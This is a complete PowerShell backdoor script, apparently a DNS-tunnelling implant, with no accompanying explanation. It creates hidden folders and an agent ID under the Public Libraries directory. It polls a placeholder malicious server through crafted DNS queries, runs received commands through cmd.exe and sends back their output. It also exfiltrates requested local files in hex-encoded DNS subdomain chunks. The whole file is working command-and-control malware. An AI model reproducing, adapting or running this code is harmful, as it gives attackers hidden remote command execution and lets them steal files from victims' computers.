# version 2.2
$aa_domain_bb = "<MALICIOUS SERVER>";
$aa_main_folder_bb = $env:PUBLIC + "\Libraries";
if (-not (Test-Path $aa_main_folder_bb)) { md $aa_main_folder_bb; }
$aa_guidFile_bb = $aa_main_folder_bb + "\quid";

$aa_lock_file_address_bb = $aa_main_folder_bb + "\lock";
if (!(Test-Path $aa_lock_file_address_bb)){sc -Path $aa_lock_file_address_bb -Value $pid;}
else
{
	$aa_time_span_bb = (NEW-TIMESPAN -Start ((Get-ChildItem $aa_lock_file_address_bb).CreationTime) -End (Get-Date)).Minutes
	if ($aa_time_span_bb -gt 10)
	{
		stop-process -id (gc $aa_lock_file_address_bb);
		ri -Path $aa_lock_file_address_bb;
	}
	return;
}

$aa_agent_id_bb = get-content $aa_guidFile_bb;
$aa_tag_bb = Get-Random -InputObject (10 .. 99);
if ($aa_agent_id_bb.length -ne 10) { $aa_agent_id_bb = $aa_tag_bb.ToString() + [guid]::NewGuid().toString().replace('-', '').substring(0, 8); $aa_agent_id_bb | sc $aa_guidFile_bb }
gi $aa_guidFile_bb -Force | %{ $_.Attributes = "Hidden" }
${global:$aa_text_receive_type_exception_bb} = 0;

function aa_AdrGen_bb ($aa_part_nosss_bb, $aa_actionsss_bb, $aa_datasss_bb, $aa_file_namesss_bb, $aa_file_sender_or_receiversss_bb, $aa_request_num_bb)
{
	$aa_extra_randsss_bb = -join ((48 .. 57)+(65 .. 70) | Get-Random  -Count (%{ Get-Random -InputObject (1 .. 7) }) | %{ [char]$_ });
	$aa_ctrl_random_placesss_bb = Get-Random -InputObject (0 .. 9) -Count 2;
	$aa_control_data_and_randsss_bb = $aa_agent_id_bb.Insert(($aa_ctrl_random_placesss_bb[1]), $aa_actionsss_bb).Insert($aa_ctrl_random_placesss_bb[0], $aa_part_nosss_bb);
	if ($aa_file_sender_or_receiversss_bb -eq "s")
	{ return "$($aa_control_data_and_randsss_bb)$($aa_request_num_bb)$($aa_extra_randsss_bb)C$($aa_ctrl_random_placesss_bb[0])$($aa_ctrl_random_placesss_bb[1])T.$aa_datasss_bb.$aa_file_namesss_bb.$aa_domain_bb"; }
	else 
	{ return "$($aa_control_data_and_randsss_bb)$($aa_request_num_bb)$($aa_extra_randsss_bb)C$($aa_ctrl_random_placesss_bb[0])$($aa_ctrl_random_placesss_bb[1])T.$($aa_domain_bb)";}
}

function aa_get_default_gateway_bb()
{
	$aa_default_gatewary_bb = $null;
	try
	{
		$aa_default_gatewary_bb = ((Get-WmiObject Win32_NetworkAdapterConfiguration -ComputerName $env:computername -EA Stop | ? { $_.IPEnabled }).DNSServerSearchOrder)[0] | Out-String
	}
	catch [exception] {
		#Write-Host $_.Message
	}
	if (!$aa_default_gatewary_bb)
	{
		try
		{
			$ns = nslookup.exe 8.8.8.8;
			$aa_default_gatewary_bb = ($ns[1] -split ':')[1].Trim();
		}
		catch [exception] {
			#Write-Host $_.Message
		}
	}
	return $aa_default_gatewary_bb
}

function aa_text_response_bb ($aa_message_bb)
{
	$ip = aa_get_default_gateway_bb
	$ars = [system.net.IPAddress]::Parse([System.Net.Dns]::GetHostAddresses($aa_domain_bb));
	$end = New-Object System.Net.IPEndPoint $ars, 53
	$s = New-Object System.Net.Sockets.UdpClient
	$s.Client.ReceiveTimeout = $s.Client.SendTimeout = 15000
	$s.Connect($end)
	$pre = (0xa4, 0xa3, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
	if (!$aa_message_bb.StartsWith('.')) { $aa_message_bb = "." + $aa_message_bb; }
	if (!$aa_message_bb.EndsWith('.')) { $aa_message_bb = $aa_message_bb + "."; }
	$mb = [System.Text.Encoding]::ASCII.GetBytes($aa_message_bb)
	$p = $aa_message_bb.Split('.')
	$pi = 1
	for ($i = 0; $i -lt $mb.length; $i++) { if ($mb[$i] -eq 0x2e) { $mb[$i] = $p[$pi].Length; $pi++ } }
	$pre += $mb
	$pre += (0x00, 0x10, 0x00, 0x01)
	$buf = $pre
	$Sent = $s.Send($buf, $buf.Length)
	$rb = $s.Receive([ref]$end)
	$r = [byte[]]( ,0x0 * ($rb.length - ($mb.length + 29)))
	[System.Buffer]::BlockCopy($rb, $mb.length + 29, $r, 0, ($rb.length - ($mb.length + 29)))
	return $r
}

function aa_ping_response_bb ($aa_message_bb)
{
	$ip = aa_get_default_gateway_bb
	$ars = [system.net.IPAddress]::Parse([System.Net.Dns]::GetHostAddresses($aa_domain_bb));
	$end = New-Object System.Net.IPEndPoint $ars, 53
	$s = New-Object System.Net.Sockets.UdpClient
	$s.Client.ReceiveTimeout = $s.Client.SendTimeout = 15000
	$s.Connect($end)
	$pre = (0xa4, 0xa3, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
	if (!$aa_message_bb.StartsWith('.')) { $aa_message_bb = "." + $aa_message_bb; }
	if (!$aa_message_bb.EndsWith('.')) { $aa_message_bb = $aa_message_bb + "."; }
	$mb = [System.Text.Encoding]::ASCII.GetBytes($aa_message_bb)
	$p = $aa_message_bb.Split('.')
	$pi = 1
	for ($i = 0; $i -lt $mb.length; $i++) { if ($mb[$i] -eq 0x2e) { $mb[$i] = $p[$pi].Length; $pi++ } }
	$pre += $mb
	$pre += (0x00, 0x01, 0x00, 0x01)
	$buf = $pre
	$Sent = $s.Send($buf, $buf.Length)
	$rb = $s.Receive([ref]$end)
	$r = [byte[]]( ,0x0 * ($rb.length - ($mb.length + 28)))
	[System.Buffer]::BlockCopy($rb, $mb.length + 28, $r, 0, ($rb.length - ($mb.length + 28)))
	return $r
}

function aa_receive_in_ping_mode_bb
{
	$aa_saveing_moodsss_bb = $false;
	$aa_countersss_bb = 0;
	$aa_save_path_bb = ${global:$aa_receive_box_bb} + "\";
	$aa_fetched_bytessss_bb = @();
	$aa_req_no_bb = "000";
	$aa_action_bb = "0";
	${global:$aa_run_bb} = $true;
	${global:$aa_exception_countersss_bb} = 0;
	${global:$$aa_exception_count_limitsss_bb} = 5;
	
	While (${global:$aa_run_bb})
	{
		Start-Sleep -m 50;
		if (${global:$aa_exception_countersss_bb} -gt ${global:$$aa_exception_count_limitsss_bb}) { break }
		if ($aa_countersss_bb -eq [int]$aa_req_no_bb) { ${global:$aa_exception_countersss_bb}++ }
		if ($aa_countersss_bb -lt 10) { $aa_req_no_bb = "00$($aa_countersss_bb)"; }
		elseif ($aa_countersss_bb -lt 100) { $aa_req_no_bb = "0$($aa_countersss_bb)"; }
		else { $aa_req_no_bb = "$($aa_countersss_bb)"; }
		$aa_lastAddress_bb = aa_AdrGen_bb $aa_req_no_bb $aa_action_bb "" "" "r"
		try
		{
			Write-Host $aa_lastAddress_bb;
			$aa_resultTmp_bb = [System.Net.Dns]::GetHostAddresses($aa_lastAddress_bb);
			Write-Host $aa_resultTmp_bb;
		}
		catch [Exception]
		{
			echo $_.Exception.GetType().FullName, $_.Exception.Message; Write-Host "excepton occured!"; ${global:$aa_exception_countersss_bb}++; continue;
		}
		
		if ($aa_resultTmp_bb -eq $null)
		{
			${global:$aa_exception_countersss_bb} = ${global:$aa_exception_countersss_bb} + 1;
			continue;
		}
		$aa_result_spilitedsss_bb = $aa_resultTmp_bb[0].IPAddressToString.Split('.');
		Write-Host "$($aa_countersss_bb):$($aa_result_spilitedsss_bb[3])`tsaveing_mode: $($aa_saveing_moodsss_bb)`t   $($aa_result_spilitedsss_bb[0]) $($aa_result_spilitedsss_bb[1]) $($aa_result_spilitedsss_bb[2])"
		if (($aa_result_spilitedsss_bb[0] -eq 1) -and ($aa_result_spilitedsss_bb[1] -eq 2) -and ($aa_result_spilitedsss_bb[2] -eq 3))
		{
			$aa_saveing_moodsss_bb = $false;
			$aa_action_bb = "0";
			$len = $aa_fetched_bytessss_bb.Length
			if ($aa_fetched_bytessss_bb[$len - 1] -eq 0 -and $aa_fetched_bytessss_bb[$len - 2] -eq 0)
			{
				$aa_fetchTmp_bb = $aa_fetched_bytessss_bb[0 .. ($len - 3)];
			}
			elseif ($aa_fetched_bytessss_bb[$len - 1] -eq 0)
			{
				$aa_fetchTmp_bb = $aa_fetched_bytessss_bb[0 .. ($len - 2)];
			}
			else
			{
				$aa_fetchTmp_bb = $aa_fetched_bytessss_bb;
			}
			[System.IO.File]::WriteAllBytes($aa_save_path_bb, $aa_fetchTmp_bb);
			$aa_fetched_bytessss_bb = @();
			$aa_fetchTmp_bb = @();
			$aa_countersss_bb = 0;
			${global:$aa_run_bb} = $false;
		}
		
		if ($aa_saveing_moodsss_bb)
		{
			if ($aa_countersss_bb -gt 250) { $aa_countersss_bb = 0; }
			if ($aa_countersss_bb -eq $aa_result_spilitedsss_bb[3])
			{
				$aa_fetched_bytessss_bb += $aa_result_spilitedsss_bb[0];
				$aa_fetched_bytessss_bb += $aa_result_spilitedsss_bb[1];
				$aa_fetched_bytessss_bb += $aa_result_spilitedsss_bb[2];
				$aa_countersss_bb = $aa_countersss_bb + 3;
			}
		}
		
		if (($aa_result_spilitedsss_bb[0] -eq 24) -and ($aa_result_spilitedsss_bb[1] -eq 125))
		{
			$aa_save_path_bb += "rcvd" + $aa_result_spilitedsss_bb[2] + "" + $aa_result_spilitedsss_bb[3];
			$aa_saveing_moodsss_bb = $true;
			$aa_action_bb = "1";
			$aa_countersss_bb = 0;
		}
		
		if (($aa_result_spilitedsss_bb[0] -eq 11) -and ($aa_result_spilitedsss_bb[1] -eq 24) -and ($aa_result_spilitedsss_bb[2] -eq 237) -and ($aa_result_spilitedsss_bb[3] -eq 110)) # kill this process
		{
			${global:$aa_run_bb} = $false;
			${global:$aa_exception_countersss_bb} = ${global:$aa_exception_countersss_bb} + 1;
		}
	}
	Start-Sleep -s 1;
}

function aa_receive_in_text_mode_bb
{
	$byts = @(); $ct = 0; $fb = @(); $rn = "000"; $aa_act_bb = "W"; $run = $true; $aa_save_file_path_bb = ${global:$aa_receive_box_bb} + "\";
	$aa_err_cntr_bb = 0;
	While ($run)
	{
		Start-Sleep -m 50;
		if ($aa_err_cntr_bb -gt 5){ $run = $false; }
		if ($ct -lt 10){$rn = "000$($ct)";}
		elseif ($ct -lt 100){$rn = "00$($ct)";}
		elseif ($ct -lt 1000){$rn = "0$($ct)";}
		else{$rn = "$($ct)";}
		try
		{
			$aa_address_tmp_bb = aa_AdrGen_bb "000" $aa_act_bb "" "" "r" $rn
			$tmp = aa_text_response_bb($aa_address_tmp_bb);
			$res = [System.Text.Encoding]::ASCII.GetString($tmp);
		}
		catch [exception] { Write-Host $_; $aa_err_cntr_bb++; ${global:$aa_text_receive_type_exception_bb}++; continue; }
		if ([string]::IsNullOrEmpty($res)) { $aa_err_cntr_bb++; ${global:$aa_text_receive_type_exception_bb}++; continue;}
		$rs = $res.Split('>');
		$data = "";
		For ($i = 0; $i -le $rs[1].Length; $i++) { if ($rs[1][$i] -lt 125 -and $rs[1][$i] -gt 41) { $data += $rs[1][$i]; } }
		if ($rs[0][0] -eq "N")
		{
			$aa_act_bb = "W";
			$aa_err_cntr_bb++;
			continue;
		}
		if ($rs[0] -eq "S000s")
		{
			$aa_err_cntr_bb = 0;
			$aa_act_bb = "D";
			$aa_save_file_path_bb += ("rcvd"+$data);
			$ct = 0;
			continue;
		}
		if ($rs[0][0] -eq 'S' -and -not ($fb -contains $rs[0]))
		{
			$aa_act_bb = "D";
			if ($rs[0].EndsWith($rn))
			{
				try
				{
					$tmp = $data.Replace('-', '+').Replace('_', '/');
					$byts += [System.Convert]::FromBase64String($tmp);
					$ct++;
					$fb += $rs[0];
				}
				catch
				{
					Write-Host "Exception in receiver_"+$_;
				}
			}
		}
		if ($rs[0].StartsWith("E"))
		{
			[System.IO.File]::WriteAllBytes($aa_save_file_path_bb, $byts);
			break;
		}
		if ($rs[0].StartsWith("C"))
		{
			$ct = 0; $run = $false;
		}
	}
}

function aa_send_function_bb($aa_send_type_bb)
{
	$aa_countersss_bb = 0;
	$aa_files_list_bb = @(gci -path (${global:$aa_send_box_bb}+"\proc*") | ? { !$_.PSIsContainer });
	if ($aa_files_list_bb -ne $null)
	{
		
		$aa_file_main_name_bb = $aa_files_list_bb[0].ToString().Substring($aa_files_list_bb[0].ToString().Length - 5)
		$aa_tmpAddress_bb = ${global:$aa_send_box_bb} + "\" + $aa_file_main_name_bb;
		rni $aa_files_list_bb[0] $aa_tmpAddress_bb -Force
		$aa_sendingBytes_bb = slaber $aa_tmpAddress_bb;
		if ([int]$aa_sendingBytes_bb.Length -le 0) { rd -path $aa_tmpAddress_bb;return; }
		$aa_chunk_size_bb = 60;
		$aa_sendingFileNamesss_bb = "*" * 54;
		$aa_sendingFileNamesss_bb = Split-path $aa_tmpAddress_bb -Leaf | % { $aa_sendingFileNamesss_bb.Insert(0, $_) } | % { $_.Insert(6, $aa_sendingBytes_bb.Length) } | %{ $_[0 .. 26] -join "" };
		$aa_sendingFileNamesss_bb = -join ($aa_sendingFileNamesss_bb | % { resolver $_ })
		$aa_fileBeginning_bb = "COCTab" + $aa_sendingFileNamesss_bb;
		$aa_sendingBytes_bb = $aa_fileBeginning_bb + $aa_sendingBytes_bb;
		$aa_ack_no_bb = "000";
		$aa_action_bb = "2";
		$aa_bulk_bb = 0;
		$aa_bulk_lock_bb = $true;
		${global:$aa_run_bb} = $true;
		$aa_meaningLess_bb = $true;
		${global:$aa_exception_countersss_bb} = 0;
		${global:$aa_exception_count_limitsss_bb} = 5;
		
		While (${global:$aa_run_bb})
		{
			Start-Sleep -m 10;
			if (${global:$aa_exception_countersss_bb} -gt ${global:$aa_exception_count_limitsss_bb})
			{
				$aa_tmp_name_1_bb = ${global:$aa_send_box_bb} + "\proc" + $aa_file_main_name_bb;
				rni $aa_tmpAddress_bb $aa_tmp_name_1_bb -Force;
				break;
			}
			
			if ($aa_countersss_bb -lt 10) { $aa_ack_no_bb = "00$($aa_countersss_bb)"; }
			elseif ($aa_countersss_bb -lt 100) { $aa_ack_no_bb = "0$($aa_countersss_bb)"; }
			else { $aa_ack_no_bb = "$($aa_countersss_bb)"; }
			
			if ($aa_countersss_bb -eq 250)
			{
				if ($aa_bulk_lock_bb)
				{
					$aa_bulk_bb += 250;
				}
				$aa_countersss_bb = 0; $aa_bulk_lock_bb = $false;
			}
			if ($aa_countersss_bb -eq 200) { $aa_bulk_lock_bb = $true; }
			
			if ($aa_sendingBytes_bb.Length -gt $aa_chunk_size_bb)
			{
				if (($aa_sendingBytes_bb.Length - $aa_chunk_size_bb * ($aa_countersss_bb + $aa_bulk_bb)) -ge $aa_chunk_size_bb)
				{
					$aa_currentChunk_bb = $aa_sendingBytes_bb.Substring($aa_chunk_size_bb * ($aa_countersss_bb + $aa_bulk_bb), $aa_chunk_size_bb);
				}
				elseif (($aa_sendingBytes_bb.Length - $aa_chunk_size_bb * ($aa_countersss_bb + $aa_bulk_bb)) -gt 0)
				{
					$aa_currentChunk_bb = $aa_sendingBytes_bb.Substring($aa_chunk_size_bb * ($aa_countersss_bb + $aa_bulk_bb), ($aa_sendingBytes_bb.Length - $aa_chunk_size_bb * ($aa_countersss_bb + $aa_bulk_bb)));
				}
				else
				{
					$aa_currentChunk_bb = "COCTabCOCT";
					${global:$aa_run_bb} = $false;
					rd -path $aa_tmpAddress_bb -Force;
				}
			}
			else
			{
				$aa_currentChunk_bb = $aa_sendingBytes_bb;
			}
			$aa_fileNameSendingTmpsss_bb = (Split-path $aa_tmpAddress_bb -Leaf) + "*" | % { resolver $_ };
			$aa_lastAddress_bb = aa_AdrGen_bb $aa_ack_no_bb $aa_action_bb $aa_currentChunk_bb $aa_fileNameSendingTmpsss_bb "s" "0000"
			try
			{
				if ($aa_send_type_bb -lt 3 -and -not ($aa_we_are_in_ping_mode_bb))
				{
					$aa_resultTmp_bb = aa_ping_response_bb($aa_lastAddress_bb);
				}
				else
				{
					$aa_resultTmp_bb = [System.Net.Dns]::GetHostAddresses($aa_lastAddress_bb);
					$aa_resultTmp_bb = $aa_resultTmp_bb.IPAddressToString.Split('.')
				}
				Write-Host $aa_resultTmp_bb;
			}
			catch [exception] { Write-Host "excepton occured!"+$_; ${global:$aa_exception_countersss_bb}++; continue; }
			
			if ($aa_resultTmp_bb -eq $null) { $aa_meaningLess_bb = $false; ${global:$aa_exception_countersss_bb}++; continue }

			if (($aa_resultTmp_bb[0] -eq $aa_agent_id_bb.Substring(0,2)) -and ($aa_resultTmp_bb[1] -eq 2) -and ($aa_resultTmp_bb[2] -eq 3))
			{
				$aa_meaningLess_bb = $false;
				$aa_countersss_bb = [int]$aa_resultTmp_bb[3];
			}
			
			if (($aa_resultTmp_bb[0] -eq 253) -and ($aa_resultTmp_bb[1] -eq 25) -and ($aa_resultTmp_bb[2] -eq 42) -and ($aa_resultTmp_bb[3] -eq 87)) # kill this process
			{
				$aa_meaningLess_bb = $false;
				$aa_bulk_bb = 0
				${global:$aa_run_bb} = $false;
				${global:$aa_exception_countersss_bb} = ${global:$aa_exception_countersss_bb} + 3;
				del $aa_tmpAddress_bb;
			}
			
			if ($aa_meaningLess_bb)
			{
				${global:$aa_exception_countersss_bb}++;
			}
		}
	}
}
function slaber ($aa_filePath_bb) {
	$f = gc $aa_filePath_bb -Encoding Byte;
	$e = resolver($f);
	return $e;
}
function resolver ($aa_byte_array_bb) {
	$cnt = 0;
	$p1 = "";
	$p2 = "";
	for ($i = 0; $i -lt $aa_byte_array_bb.Length; $i++)
	{
		if ($cnt -eq 30)
		{
			$cnt = 0;
			$res += ($p1 + $p2);
			$p1 = ""; $p2 = "";
		}
		$tmp = [System.BitConverter]::ToString($aa_byte_array_bb[$i]).Replace("-", "");
		$p1 += $tmp[0];
		$p2 += $tmp[1];
		$cnt++;
	}
	$res += ($p1 + $p2);
	return $res;
}
function aa_processor_function_bb
{
	$aa_files_list_bb = @(gci -path (${global:$aa_receive_box_bb}+"\rcvd*") | ? { !$_.PSIsContainer });
	if ($aa_files_list_bb -ne $null)
	{
		$aa_tmpAddress_bb = $aa_files_list_bb[0].ToString().Replace("rcvd", "proc")
		rni $aa_files_list_bb[0] $aa_tmpAddress_bb -Force
		$aa_result_file_to_send_bb = $aa_tmpAddress_bb -replace "receivebox", "sendbox";
		if ($aa_tmpAddress_bb.EndsWith("0"))
		{
			$aa_file_content_bb = gc $aa_tmpAddress_bb | ? { $_.trim() -ne "" };
			$aa_file_content_bb = $aa_file_content_bb | ? { $_.trim() -ne "" }
			$aa_command_result_bb += ($aa_file_content_bb + " 2>&1") | % {Try { $_ | cmd.exe | Out-String }Catch { $_ | Out-String }}
			$aa_command_result_bb +"<>" | sc $aa_result_file_to_send_bb -Encoding UTF8
			if (Test-path -path $aa_tmpAddress_bb)
			{
				rd -path $aa_tmpAddress_bb;
			}
		}
		elseif ($aa_tmpAddress_bb.EndsWith("1"))
		{
			$aa_file_address_to_doanload_bb = gc $aa_tmpAddress_bb | ? { $_.trim() -ne "" } | %{ $_.Replace("`0", "").Trim() }
			if (Test-path -path $aa_file_address_to_doanload_bb)
			{
				cpi -path $aa_file_address_to_doanload_bb -destination $aa_result_file_to_send_bb -Force;
			}
			else
			{
				"File not exist" | sc $aa_result_file_to_send_bb;
			}
			if (Test-path -path $aa_tmpAddress_bb)
			{
				rd -path $aa_tmpAddress_bb;
			}
		}
		else {
			$aa_file_done_address_bb = $aa_tmpAddress_bb -replace "receivebox", "done";
			mi -path $aa_tmpAddress_bb -destination $aa_file_done_address_bb -Force;
			if (Test-path -path $aa_file_done_address_bb)
			{
				("200<>" + $aa_file_done_address_bb) | sc $aa_result_file_to_send_bb;
				rd -path $aa_tmpAddress_bb;
			}
		}
		try
		{
			rd -path $aa_tmpAddress_bb;
		}catch{}
	}
}

${global:$aa_root_path_bb} = $aa_main_folder_bb + "\" + $aa_agent_id_bb;
${global:$aa_files_path_bb} = $aa_main_folder_bb + "\files";
${global:$aa_receive_box_bb} = ${global:$aa_root_path_bb} + "\receivebox";
${global:$aa_send_box_bb} = ${global:$aa_root_path_bb} + "\sendbox";
${global:$aa_done_box_bb} = ${global:$aa_root_path_bb} + "\done";

if (-not (Test-Path ${global:$aa_files_path_bb})) { md ${global:$aa_files_path_bb}; }
if (-not (Test-Path ${global:$aa_root_path_bb}) -or -not (Test-Path ${global:$aa_send_box_bb}))
{
	md ${global:$aa_root_path_bb};
	md ${global:$aa_send_box_bb};
	md ${global:$aa_receive_box_bb};
	md ${global:$aa_done_box_bb};
}
$aa_receive_mode_address_bb = aa_AdrGen_bb "000" "M" "" "" "r" $rn
$aa_receive_mode_bb = [System.Net.Dns]::GetHostAddresses($aa_receive_mode_address_bb);
$aa_we_are_in_ping_mode_bb = $false;
if ($aa_receive_mode_bb -eq "99.250.250.199")
{
	${global:$aa_text_receive_type_exception_bb} = 0;
	aa_receive_in_text_mode_bb;
	if (${global:$aa_text_receive_type_exception_bb} -gt 3)
	{
		$aa_we_are_in_ping_mode_bb = $true;
		$aa_change_receive_mode_address_bb = aa_AdrGen_bb "000" "P" "" "" "r" $rn
		[System.Net.Dns]::GetHostAddresses($aa_change_receive_mode_address_bb);
		aa_receive_in_ping_mode_bb;
	}
}
else
{
	$aa_we_are_in_ping_mode_bb = $true;
	aa_receive_in_ping_mode_bb;
}
aa_processor_function_bb;
aa_send_function_bb(${global:$aa_text_receive_type_exception_bb});
# remove lock file to next request
ri -Path $aa_lock_file_address_bb;
